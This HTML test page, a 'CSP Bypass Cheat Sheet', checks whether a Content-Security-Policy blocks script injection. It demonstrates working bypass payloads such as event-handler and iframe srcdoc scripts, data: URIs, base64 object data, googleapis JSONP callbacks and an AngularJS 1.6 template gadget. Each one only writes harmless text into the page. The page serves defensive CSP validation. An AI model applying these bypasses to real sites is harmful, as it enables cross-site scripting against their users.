<!DOCTYPE html>
<html lang="en" class="h-100">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="CSP Bypass Cheat Sheet page, to validate your CSP" />
    <meta name="author" content="Nicolas BÃ©guier" />
    <meta name="keywords" content="beguier csp bypass cheat sheet" />
    <meta property="og:title" content="CSP Bypass Cheat Sheet" />
    <meta property="og:image" content="https://beguier.eu/favicon_vignette.png" />
    <meta property="og:description" content="CSP Bypass Cheat Sheet page, to validate your CSP." />
    <meta property="og:url" content="https://github.com/nbeguier/csp-bypass-cheat-sheet" />
    <meta property="og:type" content="article" />
    <title>CSP Bypass Cheat Sheet</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous" />
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>

    <!-- Add Here your CSP ! -->
    <!-- No CSP -->
    <meta http-equiv="Content-Security-Policy" content="" />
    <!-- Script Unsafe Inline -->
    <!-- <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline';"> -->
    <!-- Script Data -->
    <!-- <meta http-equiv="Content-Security-Policy" content="script-src data:;"> -->
    <!-- Script GoogleAPIs -->
    <!-- <meta http-equiv="Content-Security-Policy" content="script-src https://*.googleapis.com;"> -->
    <!-- Script Cloudflare CDN -->
    <!-- <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' https://cdnjs.cloudflare.com;"> -->
    <!-- Script Predictable Nonce -->
    <!-- <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-azerty123';"> -->
    <!-- Script Self -->
    <!-- <meta http-equiv="Content-Security-Policy" content="script-src 'self';"> -->
    <!-- No Script -->
    <!-- <meta http-equiv="Content-Security-Policy" content="script-src 'none';"> -->
    <!-- Styles Self -->
    <!-- <meta http-equiv="Content-Security-Policy" content="style-src 'self';"> -->
    <!-- Default Predictable Nonce -->
    <!-- <meta http-equiv="Content-Security-Policy" content="default-src 'nonce-azerty123';" /> -->
    <!-- NOTHING -->
    <!-- <meta http-equiv="Content-Security-Policy" content="default-src 'none';"> -->

    <!-- Other examples -->
    <!-- CSP Evaluator safe policy -->
    <!-- <meta http-equiv="Content-Security-Policy" content="script-src 'strict-dynamic' 'nonce-azerty123' 'unsafe-inline' http: https:; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script';"> -->
    <!-- Github CSP -->
    <!-- <meta http-equiv="Content-Security-Policy" content="default-src 'none'; base-uri 'self'; block-all-mixed-content; connect-src 'self' uploads.github.com www.githubstatus.com collector.githubapp.com api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com cdn.optimizely.com logx.optimizely.com/v1/events wss://alive.github.com *.actions.githubusercontent.com wss://*.actions.githubusercontent.com online.visualstudio.com/api/v1/locations insights.github.com; font-src github.githubassets.com; form-action 'self' github.com gist.github.com; frame-ancestors 'none'; frame-src render.githubusercontent.com; img-src 'self' data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com secured-user-images.githubusercontent.com/ *.githubusercontent.com; manifest-src 'self'; media-src github.com user-images.githubusercontent.com/; script-src github.githubassets.com; style-src 'unsafe-inline' github.githubassets.com; worker-src github.com/socket-worker-3f088aa2.js gist.github.com/socket-worker-3f088aa2.js"> -->
    <!-- Paypal CSP -->
    <!-- <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://*.paypal.com https://*.paypalobjects.com; frame-src 'self' https://*.brighttalk.com https://*.paypal.com https://*.paypalobjects.com https://www.youtube-noco_ie.com https://www.xoom.com https://*.qualtrics.com https://*.paypal-mktg.com; script-src 'nonce-kNUamItxpM5Gulss/8t+ZsF1+q/SLXk64jaDUkgAuxjDCuNf' 'self' https://*.paypal.com https://*.paypalobjects.com https://assets-cdn.s-xoom.com 'unsafe-inline' 'unsafe-eval'; connect-src 'self' https://nominatim.openstreetmap.org https://*.paypal.com https://*.paypalobjects.com https://*.google-analytics.com https://*.salesforce.com https://*.force.com https://*.eloqua.com https://nexus.ensighten.com https://api.paypal-retaillocator.com https://*.brighttalk.com https://*.dialogtech.com https://*.qualtrics.com; style-src 'self' https://*.paypal.com https://*.paypalobjects.com https://assets-cdn.s-xoom.com 'unsafe-inline'; font-src 'self' https://*.paypal.com https://*.paypalobjects.com https://assets-cdn.s-xoom.com data:; img-src 'self' https: data:; form-action 'self' https://*.paypal.com https://*.salesforce.com https://*.eloqua.com https://secure.opinionlab.com; base-uri 'self' https://*.paypal.com; object-src 'none'; frame-ancestors 'self' https://*.paypal.com; block-all-mixed-content;"> -->
    <!-- Twitter CSP -->
    <!-- <meta http-equiv="Content-Security-Policy" content="connect-src 'self' blob: https://*.giphy.com https://*.pscp.tv https://*.video.pscp.tv https://*.twimg.com https://api.twitter.com https://api-stream.twitter.com https://ads-api.twitter.com https://aa.twitter.com https://caps.twitter.com https://media.riffsy.com https://pay.twitter.com https://sentry.io https://ton.twitter.com https://twitter.com https://upload.twitter.com https://www.google-analytics.com https://app.link https://api2.branch.io https://bnc.lt https://vmap.snappytv.com https://vmapstage.snappytv.com https://vmaprel.snappytv.com https://vmap.grabyo.com https://dhdsnappytv-vh.akamaihd.net https://pdhdsnappytv-vh.akamaihd.net https://mdhdsnappytv-vh.akamaihd.net https://mdhdsnappytv-vh.akamaihd.net https://mpdhdsnappytv-vh.akamaihd.net https://mmdhdsnappytv-vh.akamaihd.net https://mdhdsnappytv-vh.akamaihd.net https://mpdhdsnappytv-vh.akamaihd.net https://mmdhdsnappytv-vh.akamaihd.net https://dwo3ckksxlb0v.cloudfront.net ; default-src 'self'; form-action 'self' https://twitter.com https://*.twitter.com; font-src 'self' https://*.twimg.com; frame-src 'self' https://twitter.com https://mobile.twitter.com https://pay.twitter.com https://cards-frame.twitter.com ; img-src 'self' blob: data: https://*.cdn.twitter.com https://ton.twitter.com https://*.twimg.com https://analytics.twitter.com https://cm.g.doubleclick.net https://www.google-analytics.com https://www.periscope.tv https://www.pscp.tv https://media.riffsy.com https://*.giphy.com https://*.pscp.tv https://*.periscope.tv https://prod-periscope-profile.s3-us-west-2.amazonaws.com https://platform-lo_aside.fbsbx.com https://scontent.xx.fbcdn.net https://scontent-sea1-1.xx.fbcdn.net https://*.googleusercontent.com; manifest-src 'self'; media-src 'self' blob: https://twitter.com https://*.twimg.com https://*.vine.co https://*.pscp.tv https://*.video.pscp.tv https://*.giphy.com https://media.riffsy.com https://dhdsnappytv-vh.akamaihd.net https://pdhdsnappytv-vh.akamaihd.net https://mdhdsnappytv-vh.akamaihd.net https://mdhdsnappytv-vh.akamaihd.net https://mpdhdsnappytv-vh.akamaihd.net https://mmdhdsnappytv-vh.akamaihd.net https://mdhdsnappytv-vh.akamaihd.net https://mpdhdsnappytv-vh.akamaihd.net https://mmdhdsnappytv-vh.akamaihd.net https://dwo3ckksxlb0v.cloudfront.net; object-src 'none'; script-src 'self' 'unsafe-inline' https://*.twimg.com   https://www.google-analytics.com https://twitter.com https://app.link  'nonce-YzA1NzU0ZTgtZGNiNy00MzA3LTliYTYtZTNlYzcxOTg2NWY3'; style-src 'self' 'unsafe-inline' https://*.twimg.com; worker-src 'self' blob:;"> -->
  </head>

  <body class="my-3 mx-3 bg-dark">
    <div class="col-lg-8 mx-auto p-3 py-md-5 bg-light rounded">
      <h1>CSP Bypass Cheat Sheet</h1>
      <a href="https://github.com/nbeguier/csp-bypass-cheat-sheet" class="link-success">csp-bypass-cheat-sheet v1.0.0</a><br />
      <a href="https://csp-evaluator.withgoogle.com/" class="link-success">Check your CSP policy</a><br />
      <br />

      <h2>Scripts</h2>
      <div class="row row-cols-1 row-cols-md-3 gx-4">
        <div class="col themed-grid-col"><u>Attack name</u></div>
        <div class="col themed-grid-col"><u>Default</u></div>
        <div class="col themed-grid-col"><u>with Nonce (azerty123)</u></div>

        <div class="col themed-grid-col">Classic</div>
        <div class="col themed-grid-col">
          <b id="script">_</b>
          <script>
            document.getElementById("script").innerHTML = "&lt;script&gt;&period;&period;&period;&lt;&sol;script&gt;";
          </script>
          <!-- Reason: "script-src 'unsafe-inline';" -->
        </div>
        <div class="col themed-grid-col">
          <b id="script-nonce">_</b>
          <script nonce="azerty123">
            document.getElementById("script-nonce").innerHTML = "VULN (nonce=azerty123)";
          </script>
          <!-- Reason: "script-src 'nonce-azerty123';" -->
        </div>

        <div class="col themed-grid-col">Unsafe Inline via Event Attribute</div>
        <div class="col themed-grid-col">
          <audio
            src=""
            onerror="document.getElementById('script-unsafe-inline').innerHTML='&amp;lt&semi;audio src&amp;sol&semi;onerror&amp;equals&semi;&amp;quot&semi;&amp;period&semi;&amp;period&semi;&amp;period&semi;&amp;quot&semi;&amp;gt&semi;&amp;lt&semi;&amp;sol&semi;audio&amp;gt&semi;'"
          ></audio>
          <b id="script-unsafe-inline">_</b>
          <!-- Reason: "script-src 'unsafe-inline';" -->
        </div>
        <div class="col themed-grid-col">
          TODO
          <!-- Reason: "script-src 'nonce-azerty123';" -->
        </div>

        <div class="col themed-grid-col">Unsafe Inline via iFrame</div>
        <div class="col themed-grid-col">
          <iframe
            srcdoc="<script>document.write('<b>&amp;lt&semi;iframe srcdoc&amp;equals&semi;&amp;quot&semi;&amp;lt&semi;script&amp;gt&semi;&amp;period&semi;&amp;period&semi;&amp;period&semi;&amp;lt&semi;&amp;sol&semi;script&amp;gt&semi;&amp;quot&semi;&amp;gt&semi;&amp;lt&semi;&amp;sol&semi;iframe&amp;gt&semi;</b>')</script>"
            height="50"
          ></iframe>
          <!-- Reason: "script-src 'unsafe-inline';" -->
        </div>
        <div class="col themed-grid-col">
          <iframe srcdoc="<script nonce=azerty123>document.write('<b>VULN (nonce=azerty123 in &amp;lt&semi;script&amp;gt&semi;)</b>')</script>" height="50"></iframe>
          <!-- Reason: "script-src 'nonce-azerty123';" -->
        </div>

        <div class="col themed-grid-col">Data</div>
        <div class="col themed-grid-col">
          <b id="script-data">_</b>
          <script src="data:,document.getElementById('script-data').innerHTML='&amp;lt&semi;script src&amp;equals&semi;&amp;quot&semi;data&amp;colon&semi;&amp;comma&semi;&amp;period&semi;&amp;period&semi;&amp;period&semi;&amp;quot&semi;&amp;gt&semi;&amp;lt&semi;&amp;sol&semi;script&amp;gt&semi;'"></script>
          <!-- Reason: "script-src data:;" -->
        </div>
        <div class="col themed-grid-col">
          <b id="script-data-nonce">_</b>
          <script src="data:,document.getElementById('script-data-nonce').innerHTML='VULN (nonce=azerty123)'" nonce="azerty123"></script>
          <!-- Reason: "script-src 'nonce-azerty123' data:;" -->
        </div>

        <div class="col themed-grid-col">Self</div>
        <div class="col themed-grid-col">
          <b id="script-self">_</b>
          <script src="js/script-self.js"></script>
          <!-- Reason: "script-src 'self';" -->
        </div>
        <div class="col themed-grid-col">
          <b id="script-self-nonce">_</b>
          <script src="js/script-self-nonce.js" nonce="azerty123"></script>
          <!-- Reason: "script-src 'nonce-azerty123' 'self';" -->
        </div>

        <div class="col themed-grid-col">Self via iFrame</div>
        <div class="col themed-grid-col">
          <iframe srcdoc="<script src=js/script-via-iframe.js></script>" height="50"></iframe>
          <!-- Reason: "script-src 'self';" -->
        </div>
        <div class="col themed-grid-col">
          <iframe srcdoc="<script src=js/script-via-iframe-nonce.js nonce=azerty123></script>" height="50"></iframe>
          <!-- Reason: "script-src 'nonce-azerty123' 'self';" -->
        </div>
      </div>

      <h2>Objects</h2>

      <div class="row row-cols-1 row-cols-md-3 gx-4">
        <div class="col themed-grid-col"><u>Attack name</u></div>
        <div class="col themed-grid-col"><u>Default</u></div>
        <div class="col themed-grid-col"><u>with Nonce (azerty123)</u></div>

        <div class="col themed-grid-col">Classic</div>
        <div class="col themed-grid-col">
          <object data="img/object-classic.png"></object>
        </div>
        <div class="col themed-grid-col">
          <object data="img/vuln.png" nonce="azerty123"></object>
        </div>

        <div class="col themed-grid-col">Unsafe Inline</div>
        <div class="col themed-grid-col">
          <object
            data="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPGI+Jmx0O29iamVjdCBkYXRhJmVxdWFsczsmcXVvdDtkYXRhJmNvbG9uO3RleHQmc29sO2h0bWwmc2VtaTtiYXNlNjQmY29tbWE7JnBlcmlvZDsmcGVyaW9kOyZwZXJpb2Q7JnF1b3Q7Jmd0OyZsdDsmc29sO29iamVjdCZndDs8L2I+Jyk8L3NjcmlwdD4="
            height="70"
          ></object>
        </div>
        <div class="col themed-grid-col">
          <object data="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPGI+VlVMTiAobm9uY2U9YXplcnR5MTIzKTwvYj4nKTwvc2NyaXB0Pg==" height="50" nonce="azerty123"></object>
        </div>
      </div>

      <h2>Styles</h2>

      <div class="row row-cols-1 row-cols-md-3 gx-4">
        <div class="col themed-grid-col"><u>Attack name</u></div>
        <div class="col themed-grid-col"><u>Default</u></div>
        <div class="col themed-grid-col"></div>

        <div class="col themed-grid-col">Classic</div>
        <div class="col themed-grid-col">
          <link href="css/style-classic.min.css" rel="stylesheet" />
          <b class="style-classic-ok">_</b> <b class="text-light style-classic-vuln">&lt;link href&equals;&quot;css&sol;some&period;css&quot; rel&equals;&quot;stylesheet&quot; &sol;&gt;</b>
        </div>
        <div class="col themed-grid-col"></div>

        <div class="col themed-grid-col">Unsafe Inline</div>
        <div class="col themed-grid-col">
          <b style="font-size: 0px;">_</b>
          <b style="color: #212529 !important;" class="text-light">
            &lt;b style&equals;&quot;&period;&period;&period;&quot;&gt;&lt;&sol;b&gt;
            <a href="https://beguier.eu/nicolas/articles/security-tips-4-xss-with-style.html" style="color: #ffc107 !important;" class="link-light">XSS with the inline style</a>
          </b>
          <!-- Reason: "style-src 'unsafe-inline';" -->
        </div>
        <div class="col themed-grid-col"></div>
      </div>

      <br />

      <h2>Others</h2>

      <div class="row row-cols-1 row-cols-md-3 gx-4">
        <div class="col themed-grid-col"><u>Attack name</u></div>
        <div class="col themed-grid-col"><u>Default</u></div>
        <div class="col themed-grid-col"><u>with Nonce (azerty123)</u></div>

        <div class="col themed-grid-col">Trusted Types (Ex: with Script Unsafe Inline)</div>
        <div class="col themed-grid-col">
          <b id="trusted-types-script-unsafe-inline">_</b>
          <script>
            if (window.trustedTypes && window.trustedTypes.createPolicy) {
              window.trustedTypes.createPolicy("default", {
                createHTML: (string, sink) => string,
              });
            }
            document.getElementById("trusted-types-script-unsafe-inline").innerHTML =
              "&lt;script&gt;if&lpar;window&period;trustedTypes&amp;&amp;window&period;trustedTypes&period;createPolicy&rpar;&lcub;window&period;trustedTypes&period;createPolicy&lpar;&quot;default&quot;&comma;&lcub;createHTML&colon;&lpar;string&comma;sink&rpar;&equals;&gt;string&rcub;&rpar;&rcub;&period;&period;&period;&lt;&sol;script&gt;<br><br>";
          </script>
          <!-- Reason: "require-trusted-types-for 'script';" -->
        </div>
        <div class="col themed-grid-col"></div>

        <div class="col themed-grid-col">Trusted Types (Ex: with Script Self)</div>
        <div class="col themed-grid-col">
          <b id="trusted-types-script-self">_</b>
          <script src="js/trusted-types-script-self.js">
            if (window.trustedTypes && window.trustedTypes.createPolicy) {
              window.trustedTypes.createPolicy("default", {
                createHTML: (string, sink) => string,
              });
            }
          </script>
          <!-- Reason: "require-trusted-types-for 'script';" -->
        </div>
        <div class="col themed-grid-col"></div>

        <div class="col themed-grid-col">GoogleAPIs</div>
        <div class="col themed-grid-col">
          <b id="script-google-apis">_</b>
          <script src="https://www.googleapis.com/customsearch/v1?callback=(function(){document.getElementById('script-google-apis').innerHTML='%26lt%3Bscript%20src%26equals%3B%26quot%3Bhttps%26colon%3B%26sol%3B%26sol%3Bwww%26period%3Bgoogleapis%26period%3Bcom%26sol%3Bcustomsearch%26sol%3Bv1%26quest%3Bcallback%26equals%3B%26lpar%3Bfunction%26lpar%3B%26rpar%3B%26lcub%3B%26period%3B%26period%3B%26period%3B%26rcub%3B%26rpar%3B%26lpar%3B%26rpar%3B%26quot%3B%26gt%3B%26lt%3B%26sol%3Bscript%26gt%3B%3Cbr%3E%3Cbr%3E'})()"></script>
          <!-- Reason: "script-src https://*.googleapis.com;" -->
        </div>
        <div class="col themed-grid-col">
          <b id="script-google-apis-nonce">_</b>
          <script src="https://www.googleapis.com/customsearch/v1?callback=(function(){document.getElementById('script-google-apis-nonce').innerHTML='VULN (nonce=azerty123)'})()" nonce="azerty123"></script>
          <!-- Reason: "script-src 'nonce-azerty123' https://*.googleapis.com;" -->
        </div>

        <div class="col themed-grid-col">Cloudflare CDN</div>
        <div class="col themed-grid-col">
          <b id="script-cdnjs">_</b>
          <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
          <K Ng-App hidden>{{$new.constructor('document.getElementById("script-cdnjs").innerHTML="&amp;lt&semi;script src&amp;equals&semi;&amp;quot&semi;https&amp;colon&semi;&amp;sol&semi;&amp;sol&semi;cdnjs&amp;period&semi;cloudflare&amp;period&semi;com&amp;sol&semi;ajax&amp;sol&semi;libs&amp;sol&semi;angular&amp;period&semi;js&amp;sol&semi;1&amp;period&semi;6&amp;period&semi;0&amp;sol&semi;angular&amp;period&semi;min&amp;period&semi;js&amp;quot&semi;&amp;gt&semi;&amp;lt&semi;&amp;sol&semi;script&amp;gt&semi;&amp;lt&semi;K Ng-App hidden&amp;gt&semi;&amp;lcub&semi;&amp;lcub&semi;&amp;dollar&semi;new&amp;period&semi;constructor&amp;lpar&semi;&amp;apos&semi;&amp;period&semi;&amp;period&semi;&amp;period&semi;&amp;apos&semi;&amp;rpar&semi;&amp;lpar&semi;&amp;rpar&semi;&amp;rcub&semi;&amp;rcub&semi;&amp;lt&semi;&amp;sol&semi;K&amp;gt&semi;&lt;br&gt;&lt;br&gt;"')()}}</K>          <!-- Reason: "script-src 'unsafe-eval' https://cdnjs.cloudflare.com;" -->
        </div>
        <div class="col themed-grid-col">
          ð  (nonce=azerty123)
          <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js" nonce="azerty123"></script>
          <!-- Reason: "script-src 'nonce-azerty123' 'unsafe-eval' https://cdnjs.cloudflare.com;" -->
        </div>

        <div class="col themed-grid-col">
          More JSONP <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/jsonp_endpoint.txt" class="link-info">here</a>, but deprecated...<br />
          <br />
        </div>
        <div class="col themed-grid-col"></div>
        <div class="col themed-grid-col"></div>

        <div class="col themed-grid-col">Use "Script gadgets" from common imported libs, bypasses <a href="https://github.com/google/security-research-pocs/blob/master/script-gadgets/bypasses.md" class="link-info">here</a></div>
        <div class="col themed-grid-col"></div>
        <div class="col themed-grid-col"></div>

        <!-- <script src="https://www.google.com/tools/feedback/escalation-options?callback=alert"></script> -->
        <!-- <script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=document%2Ewrite%28%27hello%27%29#1"></script> -->
        <!-- #1 -->
      </div>
    </div>

    <footer class="footer mt-auto py-3 bg-dark text-light">
      <div class="container">
        <p class="text-muted text-center mb-0">
          <a class="link-info" href="https://beguier.eu/nicolas/">Nicolas Beguier</a> - Copyright &copy; 2021<br />
          Licensed under the Apache License, Version 2.0
        </p>
      </div>
    </footer>
  </body>
</html>
